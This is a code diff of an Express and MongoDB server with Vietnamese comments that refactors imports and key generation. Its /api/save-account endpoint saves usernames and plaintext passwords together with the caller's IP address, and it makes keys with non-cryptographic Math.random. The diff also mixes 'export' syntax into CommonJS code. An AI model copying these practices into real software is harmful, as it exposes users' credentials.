@@ -9,11 +9,11 @@
 //thì làm ơn tăng cái biến đếm này Lên
 //để người xui xẻo tiếp theo còn biết đường chạy:
 //
-import express from 'express'; // Thay require bằng import
-import mongoose from 'mongoose';
-import cors from 'cors';
-import dotenv from 'dotenv';
-import { generateKey } from '../script/phu_tro/tao_key/make_key.js';
+//total_hours_wasted_here = 0 
+
+const express = require('express');
+const mongoose = require('mongoose');
+const cors = require('cors');
 const app = express();
 const PORT = process.env.PORT || 3000; // Để chạy được trên Render
 require('dotenv').config();
@@ -25,18 +25,27 @@ app.use(cors());
 // 2. Kết nối MongoDB
 const mongoURI = process.env.MONGO_URI;
 
-
 mongoose.connect(mongoURI)
     .then(() => console.log("✅ Đã kết nối MongoDB thành công!"))
     .catch(err => console.error("❌ Lỗi kết nối MongoDB:", err));
-const makenewKey = generateKey();
+
+
+// Hàm tạo một chuỗi key ngẫu nhiên dài 16 ký tự
+export function generateKey() {
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@$%^&*';
+    let result = '';
+    for (let i = 0; i < 16; i++) {
+        result += characters.charAt(Math.floor(Math.random() * characters.length));
+    }
+    return result;
+}
 // 3. Tạo khuôn mẫu dữ liệu (Schema)
 const UserSchema = new mongoose.Schema({
     username: { type: String, required: true },
     password: { type: String, required: true },
     timestamp: { type: Date, default: Date.now },
     ipuser: { type: String },
-    key: { type: String, default: () => generateKey() }
+    key: { type: String, unique: true },
 });
 const User = mongoose.model('User', UserSchema);
 
@@ -52,13 +61,14 @@ app.post('/api/save-account', async (req, res) => {
         userIP = "Không xác định";
     }
     const { username, password } = req.body;
-
+    
     if (!username || !password) {
         return res.status(400).send("bad");
     }
 
     try {
-        const newUser = new User({ username, password, ipuser: userIP});
+        const userKey = generateKey();
+        const newUser = new User({ username, password, ipuser: userIP, key: userKey });
         await newUser.save(); // Lưu trực tiếp lên đám mây
         console.log("💾 Đã lưu vào MongoDB:", username);
         res.status(200).send("userok");
